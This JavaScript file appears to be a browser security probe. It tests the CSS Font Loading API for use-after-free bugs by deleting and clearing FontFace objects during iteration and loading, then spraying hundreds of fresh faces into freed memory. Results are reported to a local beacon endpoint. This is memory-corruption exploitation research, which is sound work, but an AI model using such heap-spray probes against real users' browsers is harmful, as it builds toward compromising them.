// p270 - CSSFontFace timing attack
// Tests multiple vectors for font face UAF/confusion:
// 1. Delete during for..of iteration of document.fonts
// 2. Rapid add/delete during load() promise chain
// 3. Clear during font load callback
// 4. Iterator invalidation during load events
// Beacon prefix: V270-

(function() {
  function B(tag, body) {
    try {
      if (body) {
        navigator.sendBeacon('/beacon/V270-' + tag + '?t=' + Date.now(), String(body));
      } else {
        new Image().src = '/beacon/V270-' + tag + '?t=' + Date.now();
      }
    } catch(e) {}
  }

  B('BOOT');

  // Minimal valid TrueType font builder (single glyph)
  function buildMinFont(familyName) {
    var buf = new ArrayBuffer(300);
    var d = new DataView(buf);
    var off = 0;

    function w16(v) { d.setUint16(off, v); off += 2; }
    function w32(v) { d.setUint32(off, v); off += 4; }

    // Offset table: 6 tables
    w32(0x00010000); // sfVersion
    w16(6); // numTables
    w16(0); w16(0); w16(0); // search params

    // Table directory (6 entries x 16 bytes = 96 bytes, starts at offset 12)
    var dirOff = 12;
    var dataStart = 12 + 6 * 16; // 108

    // We'll write tables after directory
    var tables = {};
    var tableData = [];

    function addTable(tag, data) {
      tables[tag] = { offset: dataStart, length: data.length };
      for (var i = 0; i < data.length; i++) {
        d.setUint8(dataStart + i, data[i]);
      }
      // Pad to 4-byte boundary
      var padded = (data.length + 3) & ~3;
      dataStart += padded;
    }

    // head table (54 bytes)
    var head = new Uint8Array(54);
    var hv = new DataView(head.buffer);
    hv.setUint32(0, 0x00010000); // version
    hv.setUint32(4, 0x00005000); // fontRevision
    hv.setUint32(8, 0x00000000); // checkSumAdjustment (fix later)
    hv.setUint32(12, 0x5F0F3CF5); // magicNumber
    hv.setUint16(16, 0x000B); // flags
    hv.setUint16(18, 1000); // unitsPerEm
    // skip dates (16 bytes of zeros)
    hv.setInt16(36, 0); // xMin
    hv.setInt16(38, 0); // yMin
    hv.setInt16(40, 1000); // xMax
    hv.setInt16(42, 1000); // yMax
    hv.setUint16(44, 0); // macStyle
    hv.setUint16(46, 8); // lowestRecPPEM
    hv.setInt16(48, 2); // fontDirectionHint
    hv.setInt16(50, 1); // indexToLocFormat (long)
    hv.setInt16(52, 0); // glyphDataFormat
    addTable('head', head);

    // hhea table (36 bytes)
    var hhea = new Uint8Array(36);
    var hh = new DataView(hhea.buffer);
    hh.setUint32(0, 0x00010000); // version
    hh.setInt16(4, 800); // ascender
    hh.setInt16(6, -200); // descender
    hh.setInt16(8, 0); // lineGap
    hh.setUint16(10, 1000); // advanceWidthMax
    hh.setUint16(34, 1); // numberOfHMetrics
    addTable('hhea', hhea);

    // maxp table (6 bytes)
    var maxp = new Uint8Array(6);
    var mp = new DataView(maxp.buffer);
    mp.setUint32(0, 0x00005000); // version 0.5 (TrueType)
    mp.setUint16(4, 1); // numGlyphs
    addTable('maxp', maxp);

    // hmtx table (4 bytes: 1 entry)
    var hmtx = new Uint8Array(4);
    var hm = new DataView(hmtx.buffer);
    hm.setUint16(0, 500); // advanceWidth
    hm.setInt16(2, 0); // lsb
    addTable('hmtx', hmtx);

    // cmap table (minimal format 0)
    var cmap = new Uint8Array(262);
    var cm = new DataView(cmap.buffer);
    cm.setUint16(0, 0); // version
    cm.setUint16(2, 1); // numTables
    cm.setUint16(4, 1); // platformID (Macintosh)
    cm.setUint16(6, 0); // encodingID
    cm.setUint32(8, 12); // offset to subtable
    // Format 0 subtable at offset 12
    cm.setUint16(12, 0); // format
    cm.setUint16(14, 262 - 12); // length
    cm.setUint16(16, 0); // language
    // glyphIdArray: all zeros (map everything to glyph 0)
    addTable('cmap', cmap);

    // post table (32 bytes, format 3)
    var post = new Uint8Array(32);
    var po = new DataView(post.buffer);
    po.setUint32(0, 0x00030000); // format 3.0
    po.setUint32(4, 0x00010000); // italicAngle
    po.setInt16(8, -100); // underlinePosition
    po.setInt16(10, 50); // underlineThickness
    addTable('post', post);

    // Write table directory entries
    off = 12;
    var tags = ['head', 'hhea', 'maxp', 'hmtx', 'cmap', 'post'];
    for (var i = 0; i < tags.length; i++) {
      var tag = tags[i];
      var t = tables[tag];
      // Write tag as 4 ASCII bytes
      for (var j = 0; j < 4; j++) d.setUint8(off + j, tag.charCodeAt(j));
      off += 4;
      w32(0); // checksum (skip for now)
      w32(t.offset);
      w32(t.length);
    }

    return buf.slice(0, dataStart);
  }

  // Test 1: Delete during for..of iteration
  function test1() {
    try {
      var faces = [];
      for (var i = 0; i < 8; i++) {
        var f = new FontFace('T1F' + i, buildMinFont('T1F' + i));
        document.fonts.add(f);
        faces.push(f);
      }
      B('T1-ADDED-' + faces.length);

      var count = 0;
      var deleted = 0;
      try {
        for (var face of document.fonts) {
          count++;
          if (count === 3) {
            // Delete faces while iterating
            for (var i = 4; i < 8; i++) {
              document.fonts.delete(faces[i]);
              deleted++;
            }
          }
        }
      } catch(e) {
        B('T1-ITER-ERR-' + e.message.substring(0, 30));
      }
      B('T1-ITERATED-' + count + '-DEL-' + deleted);

      // Cleanup
      for (var i = 0; i < faces.length; i++) {
        try { document.fonts.delete(faces[i]); } catch(e) {}
      }
    } catch(e) {
      B('T1-ERR-' + e.message.substring(0, 40));
    }
  }

  // Test 2: Rapid add/delete during load promise chain
  function test2() {
    try {
      var faces = [];
      for (var i = 0; i < 8; i++) {
        var f = new FontFace('T2F' + i, buildMinFont('T2F' + i));
        document.fonts.add(f);
        faces.push(f);
      }
      B('T2-ADDED-' + faces.length);

      // Start loading all faces
      var loadPromise = document.fonts.load('48px T2F0');

      // Immediately delete some faces
      for (var i = 4; i < 8; i++) {
        document.fonts.delete(faces[i]);
      }
      B('T2-DELETED-4');

      // Add new faces to reclaim memory
      var spray = [];
      for (var i = 0; i < 100; i++) {
        var s = new FontFace('T2S' + i, buildMinFont('T2S' + i));
        document.fonts.add(s);
        spray.push(s);
      }
      B('T2-SPRAY-' + spray.length);

      loadPromise.then(function(loaded) {
        B('T2-LOADED-' + loaded.length);
        // Check if any loaded face references freed memory
        for (var i = 0; i < loaded.length; i++) {
          try {
            B('T2-FACE-' + i + '-' + loaded[i].family + '-' + loaded[i].status);
          } catch(e) {
            B('T2-FACE-' + i + '-CORRUPT-' + e.message.substring(0, 20));
          }
        }
      }).catch(function(e) {
        B('T2-LOAD-ERR-' + e.message.substring(0, 30));
      });

      // Cleanup in timeout
      setTimeout(function() {
        for (var i = 0; i < spray.length; i++) {
          try { document.fonts.delete(spray[i]); } catch(e) {}
        }
        for (var i = 0; i < faces.length; i++) {
          try { document.fonts.delete(faces[i]); } catch(e) {}
        }
      }, 2000);
    } catch(e) {
      B('T2-ERR-' + e.message.substring(0, 40));
    }
  }

  // Test 3: Clear during check() / load overlap
  function test3() {
    try {
      var faces = [];
      for (var i = 0; i < 16; i++) {
        var f = new FontFace('T3F' + i, buildMinFont('T3F' + i));
        document.fonts.add(f);
        faces.push(f);
      }
      B('T3-ADDED-' + faces.length);

      // Start a load
      document.fonts.load('48px T3F0').then(function() {
        B('T3-LOAD-DONE');
      }).catch(function(e) {
        B('T3-LOAD-ERR-' + e);
      });

      // Immediately clear all
      document.fonts.clear();
      B('T3-CLEARED');

      // Check status of faces after clear
      for (var i = 0; i < faces.length; i++) {
        try {
          B('T3-POST-' + i + '-' + faces[i].status);
        } catch(e) {
          B('T3-POST-' + i + '-ERR-' + e.message.substring(0, 20));
        }
      }

      // Now spray new faces into reclaimed memory
      for (var i = 0; i < 200; i++) {
        try {
          var s = new FontFace('T3S' + i, buildMinFont('T3S' + i));
          document.fonts.add(s);
        } catch(e) {}
      }
      B('T3-SPRAYED');

      // Try to use the old face references
      setTimeout(function() {
        for (var i = 0; i < faces.length; i++) {
          try {
            var s = faces[i].status;
            var fam = faces[i].family;
            if (fam !== 'T3F' + i) {
              B('T3-CORRUPT-' + i + '-FAM-' + fam);
            }
          } catch(e) {
            B('T3-LATE-ERR-' + i + '-' + e.message.substring(0, 20));
          }
        }
        B('T3-LATE-CHECK-DONE');
      }, 500);
    } catch(e) {
      B('T3-ERR-' + e.message.substring(0, 40));
    }
  }

  // Test 4: Rapid add/delete cycles with GC pressure
  function test4() {
    try {
      var staleRefs = [];
      for (var cycle = 0; cycle < 20; cycle++) {
        var faces = [];
        for (var i = 0; i < 10; i++) {
          var f = new FontFace('T4C' + cycle + 'F' + i, buildMinFont('T4'));
          document.fonts.add(f);
          faces.push(f);
        }
        // Keep some references
        staleRefs.push(faces[0]);
        staleRefs.push(faces[5]);

        // Delete all
        document.fonts.clear();

        // GC pressure
        var junk = [];
        for (var j = 0; j < 1000; j++) junk.push({x: j, y: new Array(10)});
        junk = null;
      }
      B('T4-CYCLES-20');

      // Check stale references
      var corrupted = 0;
      for (var i = 0; i < staleRefs.length; i++) {
        try {
          var s = staleRefs[i].status;
          var fam = staleRefs[i].family;
          if (!fam.startsWith('T4C')) corrupted++;
        } catch(e) {
          corrupted++;
          B('T4-STALE-ERR-' + i + '-' + e.message.substring(0, 20));
        }
      }
      B('T4-STALE-CHECKED-' + staleRefs.length + '-CORRUPT-' + corrupted);
    } catch(e) {
      B('T4-ERR-' + e.message.substring(0, 40));
    }
  }

  // Run tests sequentially
  test1();
  setTimeout(test2, 500);
  setTimeout(test3, 2000);
  setTimeout(test4, 4000);
  setTimeout(function() { B('ALL-DONE'); }, 6000);
})();
